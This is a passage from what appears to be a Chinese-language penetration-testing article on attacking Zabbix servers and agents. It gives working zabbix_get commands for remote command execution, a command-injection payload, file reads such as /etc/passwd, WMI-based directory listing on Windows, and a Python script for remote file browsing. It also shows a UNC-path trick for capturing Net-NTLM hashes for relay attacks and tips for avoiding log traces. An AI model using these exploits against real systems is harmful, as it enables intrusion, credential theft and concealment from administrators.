Server就肯定能在Agent上执行命令，其实不然，Agent远程执行系统命令需要在`zabbix_agentd.conf`配置文件中开启EnableRemoteCommands参数。
在Zabbix Web上添加脚本，“执行在”选项可根据需求选择， **“执行在Zabbix服务器”
不需要开启EnableRemoteCommands参数，所以一般控制Zabbix Web后可通过该方式在Zabbix
Server上执行命令拿到服务器权限。**
如果要指定某个主机执行该脚本，可从Zabbix Web的“监测中 ->
最新数据”功能中根据过滤条件找到想要执行脚本的主机，单击主机名即可在对应Agent上执行脚本。
**这里有个常见误区，如果类型是“执行在Zabbix服务器”，无论选择哪台主机执行脚本，最终都是执行在Zabbix Server上。**
如果类型是“执行在Zabbix客户端”，Agent配置文件在未开启EnableRemoteCommands参数的情况下会返回报错。
Agent配置文件在开启EnableRemoteCommands参数的情况下可成功下发执行系统命令。
如果不想在Zabbix Web上留下太多日志痕迹，或者想批量控制Agent，拿下Zabbix
Server权限后可以通过zabbix_get命令向Agent执行监控项命令， **在Zabbix
Web执行脚本实际上等于执行system.run监控项命令** 。
也可以基于Zabbix Server作为隧道跳板，在本地执行zabbix_get命令也能达到同样效果（Zabbix Agent为IP白名单校验）。
### 2\. UserParameter自定义参数命令注入
之前介绍UserParameter参数的时候提到过，执行监控项时UserParameter参数command命令的2等会被替换成item传参值，存在命令注入的风险，但默认受UnsafeUserParameters参数限制无法传入特殊字符。
当Zabbiax
Agent的`zabbix_agentd.conf`配置文件开启UnsafeUserParameters参数的情况下，传参值字符不受限制，只需要找到存在传参的自定义参数UserParameter，就能达到命令注入的效果。
举个简单案例，在`zabbix_agentd.conf`文件中添加自定义参数：
    UserParameter=ping[*],echo $1
默认情况下UnsafeUserParameters被禁用，传入特殊字符将无法执行命令。
在`zabbix_agentd.conf` 文件中添加 `UnsafeUserParameters=1`，command经过传参拼接后成功注入系统命令。
    zabbix_get -s 172.19.0.5 -p 10050 -k "ping[test && id]"
UnsafeUserParameters参数配置不当问题在监控规模较大的内网里比较常见，内网渗透时可以多留意Agent配置信息。
### 3\. 任意文件读取
Zabbix Agent如果没有配置不当的问题，是否有其他姿势可以利用呢？答案是肯定的。
Zabbix原生监控项中，`vfs.file.contents`命令可以读取指定文件，但无法读取超过64KB的文件。
    zabbix_get -s 172.19.0.5 -p 10050 -k "vfs.file.contents[/etc/passwd]"
**zabbix_agentd服务默认以低权限用户zabbix运行，读取文件受zabbix用户权限限制。开启AllowRoot参数情况下zabbix_agentd服务会以root权限运行，利用`vfs.file.contents`命令就能任意文件读取。**
如果文件超过64KB无法读取，在了解该文件字段格式的情况下可利用`vfs.file.regexp`命令正则获取关键内容。
### 4\. Windows目录遍历
Zabbix原生监控项中，`wmi.get`命令可以执行WMI查询并返回第一个对象，通过WQL语句可以查询许多机器信息，以下例举几种利用场景：
  * 遍历盘符
由于`wmi.get`命令每次只能返回一行数据，所以需要利用WQL的条件语句排除法逐行获取数据。
比如WQL查询盘符时，只返回了C:
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM Win32_LogicalDisk\"]"
通过追加条件语句排除已经查询处理的结果，从而获取下一行数据。
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM Win32_LogicalDisk WHERE Name!='C:'\"]"
可通过脚本一直追加条件语句进行查询，直至出现`Cannot obtain WMI
information.`代表WQL已经无法查询出结果。从图中可以看到通过`wmi.get`命令查询出了该机器上存在C:、D:盘符。
  * 遍历目录
获取C:下的目录，采用条件语句排除法逐行获取。
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Caption FROM Win32_Directory WHERE Drive='C:' AND Path='\\\\' \"]"
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Caption FROM Win32_Directory WHERE Drive='C:' AND Path='\\\\' AND Caption != 'C:\\\\\$Recycle.Bin' \"]"
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Caption FROM Win32_Directory WHERE Drive='C:' AND Path='\\\\' AND Caption != 'C:\\\\\$Recycle.Bin' AND Caption != 'C:\\\\\$WinREAgent' \"]"
    ...
获取C:下的文件，采用条件语句排除法逐行获取。
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\' \"]"
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\' AND Name != 'C:\\\\\$WINRE_BACKUP_PARTITION.MARKER' \"]"
    zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\' AND Name != 'C:\\\\\$WINRE_BACKUP_PARTITION.MARKER' AND Name !='C:\\\\browser.exe' \"]"
    ...
利用`wmi.get`命令进行目录遍历、文件遍历，结合`vfs.file.contents`命令就能够在Windows下实现任意文件读取。
基于zabbix_get命令写了个python脚本，实现Windows的列目录、读文件功能。
    import os
    import sys
    count = 0
    def zabbix_exec(ip, command):
        global count
        count = count + 1
        check = os.popen("./zabbix_get -s " + ip + " -k \"" + command + "\"").read()
        if "Cannot obtain WMI information" not in check:
            return check.strip()
        else:
            return False
    def getpath(path):
        return path.replace("\\","\\\\\\\\").replace("$","\\$")
    def GetDisk(ip):
        where = ""
        while(True):
            check_disk = zabbix_exec(ip, "wmi.get[root\cimv2,\\\"SELECT Name FROM Win32_LogicalDisk WHERE Name != '' " + where + "\\\"]")
            if check_disk:
                print(check_disk)
                where = where + "AND Name != '" + check_disk+ "'"
            else:
                break
    def GetDirs(ip, dir):
        drive = dir[0:2]
        path = dir[2:]
        where = ""
        while(True):
            check_dir = zabbix_exec(ip, "wmi.get[root\cimv2,\\\"SELECT Caption FROM Win32_Directory WHERE Drive='" + drive + "' AND Path='" + getpath(path) + "' " + where + "\\\"]")
            if check_dir:
                print(check_dir)
                where = where + "AND Caption != '" + getpath(check_dir) + "'"
            else:
                break
    def GetFiles(ip, dir):
        drive = dir[0:2]
        path = dir[2:]
        where = ""
        while(True):
            check_file = zabbix_exec(ip, "wmi.get[root\cimv2,\\\"SELECT Name FROM CIM_DataFile WHERE Drive='" + drive + "' AND Path='" + getpath(path) + "' " + where + "\\\"]")
            if check_file:
                if "Invalid item key format" in check_file:
                    continue
                print(check_file)
                where = where + "AND Name != '" + getpath(check_file) + "'"
            else:
                break
    def Readfile(ip, file):
        read = zabbix_exec(ip, "vfs.file.contents[" + file + "]")
        print(read)
    if __name__ == "__main__":
        if len(sys.argv) == 2:
            GetDisk(sys.argv[1])
        elif sys.argv[2][-1] != "\\":
            Readfile(sys.argv[1], sys.argv[2])
        else:
            GetDirs(sys.argv[1],sys.argv[2])
            GetFiles(sys.argv[1],sys.argv[2])
        print("Request count: " + str(count))
### 5\. Windows UNC路径利用
在Windows Zabbix Agent环境中，可以利用`vfs.file.contents`命令读取UNC路径，窃取Zabbix
Agent机器的Net-NTLM hash，从而进一步Net-NTLM relay攻击。
Window Zabbix Agent默认安装成Windows服务，运行在SYSTEM权限下。在工作组环境中，system用户的Net-NTLM
hash为空，所以工作组环境无法利用。
在域内环境中，SYSTEM用户即机器用户，如果是Net-NTLM v1的情况下，可以利用Responder工具获取Net-NTLM v1
hash并通过算法缺陷解密拿到NTLM hash，配合资源约束委派获取域内机器用户权限，从而拿下Agent机器权限。
也可以配合CVE-2019-1040漏洞，relay到ldap上配置基于资源的约束委派进而拿下Agent机器权限。
    zabbix_get -s 192.168.30.200 -p 10050 -k "vfs.file.contents[\\\\192.168.30.243\\cc]"
### 6\. Zabbix Proxy和主动检查模式利用场景
通过zabbix_get工具执行监控项命令只适合Agent被动模式且10050端口可以通讯的场景（同时zabbix_get命令也是为了演示漏洞方便）。
如果在Zabbix Proxy场景或Agent主动检查模式的情况下，Zabbix Server无法直接与Agent
10050端口通讯，可以使用比较通用的办法，就是通过Zabbix Web添加监控项。
以UserParameter命令注入漏洞举例，给指定主机添加监控项，键值中填入监控项命令，信息类型选择文本：
在最新数据中按照筛选条件找到指定主机，等待片刻就能看到执行结果。
任意文件读取漏洞也同理：
**通过zabbix_get工具执行结果最大可返回512KB的数据，执行结果存储在MySQL上的限制最大为64KB。**
ps: 添加的监控项会一直定时执行，所以执行完后记得删除监控项。
## 七、参考链接
* * *